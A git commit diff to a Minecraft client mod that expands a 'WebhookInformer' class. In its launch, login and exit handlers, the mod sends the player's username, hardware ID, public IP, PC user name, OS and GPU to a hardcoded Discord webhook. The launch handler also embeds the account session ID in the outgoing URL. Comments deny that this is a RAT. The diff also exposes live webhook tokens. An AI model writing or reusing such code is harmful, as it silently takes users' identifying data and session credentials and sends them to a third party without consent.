646e68ccc49bb1eca19d692c2b82708443a343e6
YsnUth <79665934+YsnKey@users.noreply.github.com>
2024-08-03 11:40:31 -0500

    auth

--- src/main/java/me/alpha432/oyvey/auth/WebhookInformer.java
+++ src/main/java/me/alpha432/oyvey/auth/WebhookInformer.java
@@ -1,5 +1,9 @@
 package me.alpha432.oyvey.auth;
 
+import com.mojang.authlib.GameProfile;
+import com.mojang.blaze3d.platform.GlStateManager;
+import me.alpha432.oyvey.util.HWIDUtil;
+import me.alpha432.oyvey.util.UUIDUtil;
 import net.minecraft.client.MinecraftClient;
 
 import java.awt.*;
@@ -8,17 +12,19 @@ import java.io.InputStreamReader;
 import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.UUID;
 
 public class WebhookInformer { // If u call this class rat then pls get brain
 	public static String enteredKey = "";
-	
+
     public static void sendLogginSuccess() {
         try {
-            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269058966495826012/KGzJszHe7KKpGoexh1nOW_Eesc1DGE-2-QJqVUBxQaWHBBx6YmUYdxr4ZOB9WjoAi5mq");
+            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " successfully logged in!");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getXuid().get() + "?size=128&overlay");
+            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
 			//embed.addField("Key", "||" + enteredKey + "||", false);
+            embed.addField("Hwid", HWIDUtil.getHWID(), false);
             embed.setColor(Color.GREEN);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
@@ -27,19 +33,19 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             // ignore
         }
     }
-	
+
 	public static void sendLogginFail() {
         try {
 			if (enteredKey.isEmpty()) {
 				enteredKey = "null";
 			}
-            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269058966495826012/KGzJszHe7KKpGoexh1nOW_Eesc1DGE-2-QJqVUBxQaWHBBx6YmUYdxr4ZOB9WjoAi5mq");
+            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
-            embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " failed to Log In! (Possible Attacker)");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getUuidOrNull() + "?size=128&overlay");
+            embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " failed the Hwid check! (Possible Attacker)");
+            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
 			//embed.addField("Key", "||" + enteredKey + "||", false);
 			embed.addField("IP", "||" + getIP() + "||", false);
-			//embed.addField("HWID", HWID.getHWID(), false);
+			embed.addField("HWID", HWIDUtil.getHWID(), false);
 			embed.addField("PC-Name", "||" + System.getProperty("user.name") + "||", false);
 			embed.addField("OS-Name", System.getProperty("os.name"), false);
             embed.setColor(Color.RED);
@@ -50,14 +56,16 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             // ignore
         }
     }
-	
+
 	public static void sendLaunch() {
         try {
-            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269058966495826012/KGzJszHe7KKpGoexh1nOW_Eesc1DGE-2-QJqVUBxQaWHBBx6YmUYdxr4ZOB9WjoAi5mq");
+            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " ran Client");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getAccountType().getName() + "?size=128&overlay");
-			embed.addField("JVM", System.getProperty("java.version") + ' ' + System.getProperty("java.vendor"), false); // Trouble shooting features
+            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getSessionId().toString() + "?size=128&overlay");
+            embed.addField("JVM", System.getProperty("java.version") + ' ' + System.getProperty("java.vendor"), false); // Trouble shooting features
+            embed.addField("HWID", HWIDUtil.getHWID(), false);
+            embed.addField("GPU", GlStateManager._getString((int)7936), false); // Trouble shooting features
             embed.setColor(Color.GREEN);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
@@ -66,13 +74,13 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             // ignore
         }
     }
-	
+
 	public static void sendExit() {
         try {
-            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269058966495826012/KGzJszHe7KKpGoexh1nOW_Eesc1DGE-2-QJqVUBxQaWHBBx6YmUYdxr4ZOB9WjoAi5mq");
+            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " exited Minecraft");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getUuidOrNull() + "?size=128&overlay");
+            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
             embed.setColor(Color.GRAY);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
@@ -81,13 +89,13 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             // ignore
         }
     }
-	
+
 	public static void sendFlag(String reason) {
         try {
-            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269058966495826012/KGzJszHe7KKpGoexh1nOW_Eesc1DGE-2-QJqVUBxQaWHBBx6YmUYdxr4ZOB9WjoAi5mq");
+            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + "'s experience has been Flagged!");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getUuidOrNull() + "?size=128&overlay");
+            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
 			//embed.addField("Key", "||" + enteredKey + "||", false);
 			embed.addField("IP", "||" + getIP() + "||", false); // Omg a IP Logger!1!!1!1 :skrim:
 			//embed.addField("HWID", HWID.getHWID(), false);
@@ -102,11 +110,11 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             // ignore
         }
     }
-	
+
 	public static void getKey(String key) {
 		enteredKey = key;
 	}
-	
+
 	public static String getIP() throws Exception { // This info is already logged in KeyAuth but it only logs when login is sucessfull (Security feature, NOT a RAT)
         String line;
         StringBuilder builder = new StringBuilder();
---
+++ src/main/java/me/alpha432/oyvey/util/UUIDUtil.java
@@ -0,0 +1,18 @@
+package me.alpha432.oyvey.util;
+
+import com.mojang.authlib.GameProfile;
+import net.minecraft.client.MinecraftClient;
+
+public class UUIDUtil {
+
+    public static String getPlayerUUID() {
+        MinecraftClient client = MinecraftClient.getInstance();
+        if (client.player != null) {
+            GameProfile profile = client.player.getGameProfile();
+            if (profile != null) {
+                return profile.getId().toString(); // Returns UUID as a String
+            }
+        }
+        return "Player not found";
+    }
+}
